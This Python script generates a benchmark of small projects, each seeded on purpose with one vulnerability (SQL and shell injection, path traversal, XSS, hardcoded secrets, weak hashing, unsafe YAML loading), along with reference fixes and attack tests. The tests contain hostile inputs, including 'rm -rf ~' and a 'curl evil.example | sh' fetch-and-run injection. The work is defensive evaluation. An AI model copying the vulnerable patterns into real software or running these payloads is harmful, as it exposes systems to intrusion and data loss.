"""Builds the evaluation benchmark in eval/cases/.

Each case is a small project with ONE vulnerability, its normal tests, and a security test
that performs the attack. The code patterns here are deliberately DIFFERENT from the
training patterns in training/synth.py (class methods, date ranges, %-formatting,
make_response, class attributes, signatures, ...), so the evaluation measures whether a
model learned to fix the vulnerability type rather than memorised training templates.

Every case is validated before it is kept:
  1. the scanner detects the vulnerability in the target file
  2. the normal tests pass on the vulnerable code
  3. the security test FAILS on the vulnerable code (the attack works)
  4. a known-correct fix passes every check of the real pipeline (the case is solvable)

The 7 demo-shop vulnerabilities are added as hand-written cases.
Run:  python eval/make_cases.py
"""

from __future__ import annotations

import json
import random
import shutil
import sys
import tempfile
from pathlib import Path
from string import Template

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

from patchai import checks  # noqa: E402
from patchai.llm import LLMReply  # noqa: E402
from patchai.models import FixProposal  # noqa: E402
from patchai.pipeline import fix_finding  # noqa: E402
from patchai.scan import scan  # noqa: E402

CASES = ROOT / "eval" / "cases"
VARIANTS = 4  # random variants per family
DEV_PER_FAMILY = {0}  # variant 0 of the first 10 families is the dev set (for prompt tuning)

ENTITIES = [("asset", "assets"), ("lease", "leases"), ("shipment", "shipments"), ("donor", "donors"),
            ("vendor", "vendors"), ("clinic", "clinics"), ("tenant", "tenants"), ("volunteer", "volunteers")]
MODULE_NAMES = ["records", "storage", "service", "handlers", "core", "webapp", "tasks", "helpers", "backend"]

PROBE = '''
import sys
import types


def run_with_probe(load):
    """Load a malicious document that calls patchai_probe.attack(); report whether it ran."""
    probe = types.ModuleType("patchai_probe")
    probe.ran = False

    def attack():
        probe.ran = True
        return {}

    probe.attack = attack
    sys.modules["patchai_probe"] = probe
    try:
        load("!!python/object/apply:patchai_probe.attack []")
    except Exception:
        pass
    finally:
        del sys.modules["patchai_probe"]
    return probe.ran
'''

SHELL_RECORDER = '''
import subprocess


class Recorder:
    def __init__(self, exit_code=0):
        self.exit_code = exit_code
        self.shell = []
        self.processes = []

    def system(self, command):
        self.shell.append(command)
        return self.exit_code

    def process(self, args, *a, **kw):
        self.processes.append((args, kw))
        return subprocess.CompletedProcess(args, self.exit_code, b"", b"") if kw.pop("_run", True) else self.exit_code


def patch_all(monkeypatch, exit_code=0):
    rec = Recorder(exit_code)
    monkeypatch.setattr("os.system", rec.system)
    def run(args, *a, **kw):
        rec.processes.append((args, kw))
        return subprocess.CompletedProcess(args, exit_code, b"", b"")
    def call(args, *a, **kw):
        rec.processes.append((args, kw))
        return exit_code
    monkeypatch.setattr("subprocess.run", run)
    for name in ("call", "check_call"):
        monkeypatch.setattr(f"subprocess.{name}", call)
    monkeypatch.setattr("subprocess.check_output", lambda args, *a, **kw: rec.processes.append((args, kw)) or b"")
    return rec
'''


def t(_template: str, **values) -> str:
    return Template(_template).substitute(values).strip("\n") + "\n"


# ------------------------------------------------------------------ families
# Each returns: cwe, module code (vulnerable), reference fixed region, fix imports,
#               normal tests, security tests, extra files {path: text}

def sql_repository(r: random.Random, m: str) -> dict:
    ent, table = r.choice(ENTITIES)
    col = r.choice(["region", "status", "owner", "label", "grade"])
    v = dict(m=m, Ent=ent.capitalize(), table=table, col=col)
    code = t('''
"""Data access for $table."""
import sqlite3


class ${Ent}Repository:
    """Reads $table from the database."""

    def __init__(self, conn):
        self.conn = conn

    def by_$col(self, $col):
        rows = self.conn.execute(
            "SELECT id, $col FROM $table WHERE $col = '%s' ORDER BY id" % $col
        ).fetchall()
        return [tuple(row) for row in rows]
''', **v)
    fixed = t('''
def by_$col(self, $col):
    rows = self.conn.execute(
        "SELECT id, $col FROM $table WHERE $col = ? ORDER BY id", ($col,)
    ).fetchall()
    return [tuple(row) for row in rows]
''', **v)
    setup = t('''
import sqlite3

from $m import ${Ent}Repository


def make_repo():
    conn = sqlite3.connect(":memory:")
    conn.execute("CREATE TABLE $table (id INTEGER PRIMARY KEY, $col TEXT)")
    conn.executemany("INSERT INTO $table ($col) VALUES (?)", [("alpha",), ("beta",), ("alpha",)])
    return ${Ent}Repository(conn)
''', **v)
    tests = setup + t('''

def test_finds_matching_rows():
    assert make_repo().by_$col("alpha") == [(1, "alpha"), (3, "alpha")]


def test_no_match():
    assert make_repo().by_$col("gamma") == []
''', **v)
    security = setup + t('''

def test_injection_returns_nothing():
    assert make_repo().by_$col("x' OR '1'='1") == []


def test_quotes_are_handled():
    repo = make_repo()
    repo.conn.execute("INSERT INTO $table ($col) VALUES (?)", ("o'neil",))
    assert repo.by_$col("o'neil") == [(4, "o'neil")]
''', **v)
    return dict(cwe="CWE-89", code=code, fixed=fixed, imports=[], tests=tests, security=security)


def sql_date_range(r: random.Random, m: str) -> dict:
    _, table = r.choice(ENTITIES)
    v = dict(m=m, table=table, fn=r.choice([f"count_{table}_between", f"{table}_in_period", f"tally_{table}"]))
    code = t('''
import sqlite3


def $fn(conn, start, end):
    """How many $table were created between two ISO dates (inclusive)."""
    query = f"SELECT COUNT(*) FROM $table WHERE created >= '{start}' AND created <= '{end}'"
    return conn.execute(query).fetchone()[0]
''', **v)
    fixed = t('''
def $fn(conn, start, end):
    """How many $table were created between two ISO dates (inclusive)."""
    query = "SELECT COUNT(*) FROM $table WHERE created >= ? AND created <= ?"
    return conn.execute(query, (start, end)).fetchone()[0]
''', **v)
    setup = t('''
import sqlite3

from $m import $fn


def make_db():
    conn = sqlite3.connect(":memory:")
    conn.execute("CREATE TABLE $table (id INTEGER PRIMARY KEY, created TEXT)")
    conn.executemany("INSERT INTO $table (created) VALUES (?)", [("2024-01-05",), ("2024-02-10",), ("2024-03-15",)])
    return conn
''', **v)
    tests = setup + t('''

def test_counts_rows_in_range():
    assert $fn(make_db(), "2024-01-01", "2024-02-28") == 2


def test_empty_range():
    assert $fn(make_db(), "2025-01-01", "2025-12-31") == 0
''', **v)
    security = setup + t('''

def test_injection_does_not_change_the_count():
    assert $fn(make_db(), "2099-01-01' OR '1'='1", "2024-12-31") == 0
''', **v)
    return dict(cwe="CWE-89", code=code, fixed=fixed, imports=[], tests=tests, security=security)


TOOLS = [  # class, method, argument, words before the argument, words after
    ("Thumbnailer", "make_thumbnail", "image", ["convert", "-thumbnail", "64x64"], ["thumb.png"]),
    ("Archiver", "extract", "archive", ["tar", "-xzf"], []),
    ("Scanner", "scan_file", "upload", ["clamscan", "--no-summary"], []),
    ("Exporter", "to_pdf", "document", ["libreoffice", "--headless", "--convert-to", "pdf"], []),
]


def command_class(r: random.Random, m: str) -> dict:
    cls, method, arg, pre, post = r.choice(TOOLS)
    text = " ".join(pre + ["{}"] + post)
    as_list = ", ".join([f'"{w}"' for w in pre] + [arg] + [f'"{w}"' for w in post])
    v = dict(m=m, cls=cls, method=method, arg=arg, text=text, as_list=as_list, tool=pre[0])
    code = t('''
import subprocess


class $cls:
    """Runs $tool on files in a work folder."""

    def __init__(self, workdir):
        self.workdir = workdir

    def $method(self, $arg):
        command = "$text".format($arg)
        return subprocess.call(command, shell=True, cwd=self.workdir)
''', **v)
    fixed = t('''
def $method(self, $arg):
    command = [$as_list]
    return subprocess.call(command, cwd=self.workdir)
''', **v)
    tests = SHELL_RECORDER + "\n\n" + t('''
from $m import $cls


def test_runs_the_tool(monkeypatch):
    rec = patch_all(monkeypatch)
    assert $cls("/tmp").$method("report-2024.dat") == 0
    assert "report-2024.dat" in str(rec.processes + rec.shell)
''', **v)
    security = SHELL_RECORDER + "\n\n" + t('''
from $m import $cls


def test_input_never_reaches_a_shell(monkeypatch):
    rec = patch_all(monkeypatch)
    evil = "a.dat; rm -rf ~"
    $cls("/tmp").$method(evil)
    assert rec.shell == []
    assert rec.processes, "the tool should still run"
    for args, kw in rec.processes:
        assert kw.get("shell") is not True
        assert isinstance(args, (list, tuple)) and evil in args
''', **v)
    return dict(cwe="CWE-78", code=code, fixed=fixed, imports=[], tests=tests, security=security)


COPY_TOOLS = [("copy_backup", "source", "target", ["cp", "-r"], "Copy a backup folder."),
              ("rename_file", "old_name", "new_name", ["mv"], "Rename a file."),
              ("make_link", "target", "link_name", ["ln", "-s"], "Create a symbolic link.")]


def command_concat(r: random.Random, m: str) -> dict:
    fn, a, b, words, purpose = r.choice(COPY_TOOLS)
    v = dict(m=m, fn=fn, a=a, b=b, purpose=purpose, tool=" ".join(words),
             words=", ".join(f'"{w}"' for w in words))
    code = t('''
import os


def $fn($a, $b):
    """$purpose"""
    status = os.system("$tool " + $a + " " + $b)
    return status == 0
''', **v)
    fixed = t('''
def $fn($a, $b):
    """$purpose"""
    result = subprocess.run([$words, $a, $b])
    return result.returncode == 0
''', **v)
    tests = SHELL_RECORDER + "\n\n" + t('''
from $m import $fn


def test_success(monkeypatch):
    rec = patch_all(monkeypatch, 0)
    assert $fn("one.txt", "two.txt") is True
    assert "one.txt" in str(rec.processes + rec.shell) and "two.txt" in str(rec.processes + rec.shell)


def test_failure(monkeypatch):
    patch_all(monkeypatch, 1)
    assert $fn("one.txt", "two.txt") is False
''', **v)
    security = SHELL_RECORDER + "\n\n" + t('''
from $m import $fn


def test_input_never_reaches_a_shell(monkeypatch):
    rec = patch_all(monkeypatch)
    $fn("a.txt", "b.txt && curl evil.example | sh")
    assert rec.shell == []
    for args, kw in rec.processes:
        assert kw.get("shell") is not True
        assert isinstance(args, (list, tuple))
''', **v)
    return dict(cwe="CWE-78", code=code, fixed=fixed, imports=["import subprocess"], tests=tests, security=security)


def path_fstring(r: random.Random, m: str) -> dict:
    base, folder, fn, param, kind = r.choice([
        ("TEMPLATES_DIR", "templates", "load_template", "name", "template"),
        ("HELP_DIR", "help_pages", "help_page", "topic", "help page"),
        ("SNIPPETS_DIR", "snippets", "get_snippet", "snippet_name", "snippet"),
    ])
    v = dict(m=m, base=base, folder=folder, fn=fn, param=param, kind=kind)
    code = t('''
import os

$base = os.path.join(os.path.dirname(os.path.abspath(__file__)), "$folder")


def $fn($param):
    """Return a stored $kind."""
    with open(f"{$base}/{$param}", encoding="utf-8") as f:
        return f.read()
''', **v)
    fixed = t('''
def $fn($param):
    """Return a stored $kind."""
    base = os.path.realpath($base)
    path = os.path.realpath(os.path.join(base, $param))
    if os.path.commonpath([base, path]) != base:
        raise ValueError("Invalid name")
    with open(path, encoding="utf-8") as f:
        return f.read()
''', **v)
    tests = t('''
import pytest

from $m import $fn


def test_reads_a_stored_file():
    assert "Welcome" in $fn("welcome.txt")


def test_missing_file_raises():
    with pytest.raises(OSError):
        $fn("missing.txt")
''', **v)
    security = t('''
import os

import $m
from $m import $fn


def cannot_read(name):
    try:
        return "TOP SECRET" not in $fn(name)
    except Exception:
        return True


def test_dot_dot_cannot_escape():
    assert cannot_read("../secret.txt")


def test_absolute_path_cannot_escape():
    assert cannot_read(os.path.join(os.path.dirname(os.path.abspath($m.__file__)), "secret.txt"))
''', **v)
    extra = {f"{folder}/welcome.txt": "Welcome to the service!\n", "secret.txt": "TOP SECRET: do not share\n"}
    return dict(cwe="CWE-22", code=code, fixed=fixed, imports=[], tests=tests, security=security, extra=extra)


def path_write(r: random.Random, m: str) -> dict:
    base, fn, param = r.choice([("EXPORT_DIR", "save_export", "filename"), ("REPORTS_DIR", "write_report", "report_name"),
                                ("CACHE_DIR", "store_cache_file", "file_name")])
    v = dict(m=m, base=base, fn=fn, param=param)
    code = t('''
import os

$base = os.path.join(os.path.dirname(os.path.abspath(__file__)), "output")


def $fn($param, content):
    """Write a file into the output folder and return its path."""
    path = os.path.join($base, $param)
    with open(path, "w", encoding="utf-8") as f:
        f.write(content)
    return path
''', **v)
    fixed = t('''
def $fn($param, content):
    """Write a file into the output folder and return its path."""
    base = os.path.realpath($base)
    path = os.path.realpath(os.path.join(base, $param))
    if os.path.commonpath([base, path]) != base:
        raise ValueError("Invalid file name")
    with open(path, "w", encoding="utf-8") as f:
        f.write(content)
    return path
''', **v)
    tests = t('''
import os

import $m


def test_writes_into_the_folder(tmp_path, monkeypatch):
    monkeypatch.setattr($m, "$base", str(tmp_path))
    path = $m.$fn("data.csv", "a,b")
    assert os.path.dirname(os.path.realpath(path)) == os.path.realpath(tmp_path)
    assert (tmp_path / "data.csv").read_text() == "a,b"
''', **v)
    security = t('''
import $m


def test_cannot_write_outside_the_folder(tmp_path, monkeypatch):
    folder = tmp_path / "output"
    folder.mkdir()
    monkeypatch.setattr($m, "$base", str(folder))
    try:
        $m.$fn("../escaped.txt", "pwned")
    except Exception:
        pass
    assert not (tmp_path / "escaped.txt").exists()
''', **v)
    return dict(cwe="CWE-22", code=code, fixed=fixed, imports=[], tests=tests, security=security)


def xss_percent(r: random.Random, m: str) -> dict:
    route, var, label = r.choice([("lookup", "term", "You searched for"), ("track", "code", "Tracking"),
                                  ("hello", "visitor", "Welcome back"), ("filter", "tag", "Showing items tagged")])
    v = dict(m=m, route=route, var=var, label=label, fn=f"{route}_page")
    code = t('''
from flask import Flask, request

app = Flask(__name__)


@app.route("/$route")
def $fn():
    $var = request.args.get("$var", "")
    return "<p>$label: %s</p>" % $var
''', **v)
    fixed = t('''
@app.route("/$route")
def $fn():
    $var = request.args.get("$var", "")
    return "<p>$label: %s</p>" % escape($var)
''', **v)
    tests = t('''
from $m import app


def test_shows_the_value():
    page = app.test_client().get("/$route?$var=hello123").get_data(as_text=True)
    assert "$label" in page and "hello123" in page
''', **v)
    security = t('''
from $m import app


def test_script_is_escaped():
    page = app.test_client().get("/$route?$var=<script>alert(1)</script>").get_data(as_text=True)
    assert "<script>" not in page


def test_tag_injection_is_escaped():
    page = app.test_client().get('/$route?$var="><img src=x onerror=alert(1)>').get_data(as_text=True)
    assert "<img" not in page
''', **v)
    return dict(cwe="CWE-79", code=code, fixed=fixed, imports=["from markupsafe import escape"], tests=tests, security=security)


def xss_make_response(r: random.Random, m: str) -> dict:
    route, var = r.choice([("docs", "page"), ("user", "handle"), ("catalog", "item"), ("wiki", "article")])
    v = dict(m=m, route=route, var=var, fn=f"missing_{route}")
    code = t('''
from flask import Flask, make_response, request

app = Flask(__name__)


@app.route("/$route")
def $fn():
    $var = request.args.get("$var", "unknown")
    return make_response("<h2>Nothing found for " + $var + "</h2>", 404)
''', **v)
    fixed = t('''
@app.route("/$route")
def $fn():
    $var = request.args.get("$var", "unknown")
    return make_response("<h2>Nothing found for " + escape($var) + "</h2>", 404)
''', **v)
    tests = t('''
from $m import app


def test_not_found_page():
    response = app.test_client().get("/$route?$var=abc")
    assert response.status_code == 404
    assert "abc" in response.get_data(as_text=True)
''', **v)
    security = t('''
from $m import app


def test_script_is_escaped():
    page = app.test_client().get("/$route?$var=<script>alert(1)</script>").get_data(as_text=True)
    assert "<script>" not in page
''', **v)
    return dict(cwe="CWE-79", code=code, fixed=fixed, imports=["from markupsafe import escape"], tests=tests, security=security)


def secret_class_attribute(r: random.Random, m: str) -> dict:
    cls, service, secret = r.choice([("PaymentsConfig", "payments", "API_TOKEN"), ("MailConfig", "mail", "SMTP_PASSWORD"),
                                     ("StorageConfig", "storage", "ACCESS_SECRET"), ("CrmConfig", "crm", "CLIENT_SECRET")])
    value = "".join(r.choice("abcdef0123456789") for _ in range(24))
    v = dict(m=m, cls=cls, service=service, secret=secret, value=value)
    code = t('''
import os


class $cls:
    """Settings for the $service integration."""

    BASE_URL = "https://$service.example.com/api"
    TIMEOUT = 10
    $secret = "$value"
''', **v)
    fixed = t('''
class $cls:
    """Settings for the $service integration."""

    BASE_URL = "https://$service.example.com/api"
    TIMEOUT = 10
    $secret = os.environ.get("$secret", "")
''', **v)
    tests = t('''
from $m import $cls


def test_settings_load():
    assert $cls.TIMEOUT == 10
    assert $cls.BASE_URL.startswith("https://")
''', **v)
    security = t('''
from pathlib import Path

import $m


def test_secret_is_not_in_the_code():
    assert "$value" not in Path($m.__file__).read_text(encoding="utf-8")
''', **v)
    return dict(cwe="CWE-798", code=code, fixed=fixed, imports=[], tests=tests, security=security)


def secret_compare(r: random.Random, m: str) -> dict:
    fn, param, env = r.choice([("is_admin", "token", "ADMIN_TOKEN"), ("check_api_key", "api_token", "API_TOKEN"),
                               ("can_deploy", "deploy_token", "DEPLOY_TOKEN"), ("is_operator", "password", "OPERATOR_PASSWORD")])
    value = r.choice(["letmein-2024", "opensesame99", "admin-admin", "Spring2024!"])
    v = dict(m=m, fn=fn, param=param, env=env, value=value)
    code = t('''
import hmac


def $fn($param):
    """True if the request carries the right credential."""
    return $param == "$value"
''', **v)
    fixed = t('''
def $fn($param):
    """True if the request carries the right credential."""
    expected = os.environ.get("$env", "")
    return bool(expected) and hmac.compare_digest($param, expected)
''', **v)
    tests = t('''
from $m import $fn


def test_wrong_credential_is_rejected():
    assert $fn("wrong") is False
''', **v)
    security = t('''
from pathlib import Path

import $m


def test_credential_is_not_in_the_code():
    assert "$value" not in Path($m.__file__).read_text(encoding="utf-8")


def test_old_credential_no_longer_works():
    assert $m.$fn("$value") is False
''', **v)
    return dict(cwe="CWE-798", code=code, fixed=fixed, imports=["import os"], tests=tests, security=security)


def crypto_signature(r: random.Random, m: str) -> dict:
    fn, payload, noun = r.choice([("sign_request", "body", "request"), ("sign_webhook", "payload", "webhook"),
                                  ("message_tag", "message", "message")])
    v = dict(m=m, fn=fn, payload=payload, noun=noun, algo=r.choice(["md5", "sha1"]))
    code = t('''
import hashlib


def $fn($payload, key):
    """Signature sent with each $noun so the receiver can check it was not changed."""
    return hashlib.$algo((key + $payload).encode()).hexdigest()


def verify_$noun($payload, key, signature):
    return $fn($payload, key) == signature
''', **v)
    fixed = t('''
def $fn($payload, key):
    """Signature sent with each $noun so the receiver can check it was not changed."""
    return hmac.new(key.encode(), $payload.encode(), hashlib.sha256).hexdigest()
''', **v)
    tests = t('''
from $m import $fn, verify_$noun


def test_signature_verifies():
    assert verify_$noun("hello", "k1", $fn("hello", "k1"))


def test_signature_depends_on_the_key():
    assert $fn("hello", "k1") != $fn("hello", "k2")


def test_signature_is_stable():
    assert $fn("x", "k") == $fn("x", "k")
''', **v)
    security = t('''
import hashlib

from $m import $fn


def test_signature_is_not_a_plain_weak_hash():
    sig = $fn("amount=10", "secret-key")
    for algo in ("md5", "sha1"):
        assert sig != hashlib.new(algo, b"secret-keyamount=10").hexdigest()
    assert len(sig) >= 64
''', **v)
    return dict(cwe="CWE-327", code=code, fixed=fixed, imports=["import hmac"], tests=tests, security=security)


def crypto_derive_key(r: random.Random, m: str) -> dict:
    fn = r.choice(["derive_key", "key_from_password", "make_encryption_key"])
    v = dict(m=m, fn=fn, algo=r.choice(["md5", "sha1"]))
    code = t('''
import hashlib


def $fn(password, salt):
    """Turn a password into an encryption key."""
    return hashlib.$algo(salt + password.encode()).digest()
''', **v)
    fixed = t('''
def $fn(password, salt):
    """Turn a password into an encryption key."""
    return hashlib.pbkdf2_hmac("sha256", password.encode(), salt, 600_000)
''', **v)
    tests = t('''
from $m import $fn


def test_same_input_same_key():
    assert $fn("pw", b"salt1234") == $fn("pw", b"salt1234")


def test_salt_changes_the_key():
    assert $fn("pw", b"salt1234") != $fn("pw", b"salt5678")


def test_key_is_bytes():
    key = $fn("pw", b"salt1234")
    assert isinstance(key, bytes) and len(key) >= 16
''', **v)
    security = t('''
import hashlib

from $m import $fn


def test_key_is_not_a_single_fast_hash():
    key = $fn("pw", b"salt1234")
    for algo in ("md5", "sha1", "sha256", "sha512"):
        assert key != hashlib.new(algo, b"salt1234pw").digest(), f"one round of {algo} is cracked quickly"
''', **v)
    return dict(cwe="CWE-327", code=code, fixed=fixed, imports=[], tests=tests, security=security)


def yaml_settings(r: random.Random, m: str) -> dict:
    fn, param = r.choice([("user_settings", "text"), ("load_preferences", "yaml_text"), ("read_profile", "document")])
    v = dict(m=m, fn=fn, param=param)
    code = t('''
import yaml

DEFAULTS = {"theme": "light", "page_size": 20}


def $fn($param):
    """Settings from a user's YAML file, on top of the defaults."""
    settings = dict(DEFAULTS)
    settings.update(yaml.load($param, Loader=yaml.Loader) or {})
    return settings
''', **v)
    fixed = t('''
def $fn($param):
    """Settings from a user's YAML file, on top of the defaults."""
    settings = dict(DEFAULTS)
    settings.update(yaml.safe_load($param) or {})
    return settings
''', **v)
    tests = t('''
from $m import $fn


def test_overrides_defaults():
    assert $fn("theme: dark") == {"theme": "dark", "page_size": 20}


def test_empty_file_gives_defaults():
    assert $fn("") == {"theme": "light", "page_size": 20}
''', **v)
    security = PROBE + "\n\n" + t('''
from $m import $fn


def test_document_cannot_run_code():
    assert run_with_probe($fn) is False
''', **v)
    return dict(cwe="CWE-502", code=code, fixed=fixed, imports=[], tests=tests, security=security)


def yaml_file_loader(r: random.Random, m: str) -> dict:
    cls = r.choice(["PipelineFile", "RecipeLoader", "WorkflowSpec"])
    v = dict(m=m, cls=cls)
    code = t('''
import yaml


class $cls:
    """A YAML file uploaded by a user."""

    def __init__(self, path):
        self.path = path

    def load(self):
        with open(self.path, encoding="utf-8") as f:
            return yaml.load(f, Loader=yaml.Loader)
''', **v)
    fixed = t('''
def load(self):
    with open(self.path, encoding="utf-8") as f:
        return yaml.safe_load(f)
''', **v)
    tests = t('''
from $m import $cls


def test_loads_a_file(tmp_path):
    path = tmp_path / "spec.yaml"
    path.write_text("steps:\\n  - build\\n  - test\\n")
    assert $cls(str(path)).load() == {"steps": ["build", "test"]}
''', **v)
    security = PROBE + "\n\n" + t('''
import os
import tempfile

from $m import $cls


def test_file_cannot_run_code():
    def load(text):
        fd, path = tempfile.mkstemp(suffix=".yaml")
        with os.fdopen(fd, "w") as f:
            f.write(text)
        try:
            return $cls(path).load()
        finally:
            os.remove(path)
    assert run_with_probe(load) is False
''', **v)
    return dict(cwe="CWE-502", code=code, fixed=fixed, imports=[], tests=tests, security=security)


FAMILIES = [sql_repository, sql_date_range, command_class, command_concat, path_fstring, path_write,
            xss_percent, xss_make_response, secret_class_attribute, secret_compare,
            crypto_signature, crypto_derive_key, yaml_settings, yaml_file_loader]

SHOP_FILES = {"CWE-89": "shop/db.py", "CWE-79": "shop/views.py", "CWE-22": "shop/invoices.py",
              "CWE-78": "shop/suppliers.py", "CWE-798": "shop/config.py", "CWE-327": "shop/accounts.py",
              "CWE-502": "shop/catalog.py"}


# ------------------------------------------------------------------ building and validating

def write_project(folder: Path, module: str, case: dict) -> None:
    files = {f"{module}.py": case["code"], f"tests/test_{module}.py": case["tests"],
             f"security_tests/test_cwe{case['cwe'].split('-')[1]}_attack.py": case["security"], **case.get("extra", {})}
    for rel, text in files.items():
        path = folder / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_bytes(text.encode("utf-8"))


def validate(project: Path, file: str, cwe: str, reference: FixProposal) -> str | None:
    """Return None if the case is valid, otherwise why not."""
    findings = [f for f in scan(project) if f.file_path == file and f.cwe == cwe]
    if not findings:
        return "the scanner does not detect it"
    failing, summary = checks.failing_tests(project)
    if failing:
        return f"normal tests fail on the vulnerable code: {summary}"
    if checks.run_security_test(project, findings[0]).passed:
        return "the security test passes on the vulnerable code (the attack doesn't work)"
    answer = reference.model_dump_json()
    result = fix_finding(project, findings[0], model="reference", max_attempts=1, use_rag=False,
                         chat_fn=lambda messages, model: LLMReply(answer, model, 0, 0, 0.0))
    if result.verdict != "fixed":
        failed = [f"{c.name}: {c.details}" for c in result.final.checks if not c.passed] if result.final else [result.error]
        return f"the reference fix does not pass: {failed}"
    return None


def main() -> None:
    if CASES.exists():
        shutil.rmtree(CASES)
    CASES.mkdir(parents=True)
    manifest, rejected = [], []

    for fi, family in enumerate(FAMILIES):
        for variant in range(VARIANTS):
            r = random.Random(f"{family.__name__}-{variant}")
            module = f"{r.choice(MODULE_NAMES)}_{r.choice(['app', 'lib', 'mod', 'utils', 'api'])}"
            case = family(r, module)
            case_id = f"{case['cwe'].lower().replace('-', '')}_{family.__name__}_{variant}"
            reference = FixProposal(status="fixed", fixed_code=case["fixed"], imports_to_add=case["imports"],
                                    explanation="reference fix", confidence=1.0)
            with tempfile.TemporaryDirectory() as tmp:
                project = Path(tmp) / "project"
                write_project(project, module, case)
                problem = validate(project, f"{module}.py", case["cwe"], reference)
                if problem:
                    rejected.append((case_id, problem))
                    print(f"  ✘ {case_id}: {problem}")
                    continue
                shutil.copytree(project, CASES / case_id / "project")
            split = "dev" if variant in DEV_PER_FAMILY and fi < 10 else "test"
            entry = {"id": case_id, "cwe": case["cwe"], "family": family.__name__, "source": "generated",
                     "split": split, "project": f"eval/cases/{case_id}/project", "file": f"{module}.py",
                     "reference_fix": reference.model_dump()}
            (CASES / case_id / "case.json").write_text(json.dumps(entry, indent=2), encoding="utf-8")
            manifest.append(entry)
            print(f"  ✔ {case_id} ({split})")

    for cwe, file in SHOP_FILES.items():
        manifest.append({"id": f"shop_{cwe.lower().replace('-', '')}", "cwe": cwe, "family": "vuln_shop",
                         "source": "handwritten", "split": "test", "project": "demo_projects/vuln_shop", "file": file})

    (CASES / "manifest.json").write_text(json.dumps(manifest, indent=2), encoding="utf-8")
    test = sum(c["split"] == "test" for c in manifest)
    print(f"\n{len(manifest)} cases ({test} test, {len(manifest) - test} dev), {len(rejected)} rejected.")


if __name__ == "__main__":
    main()
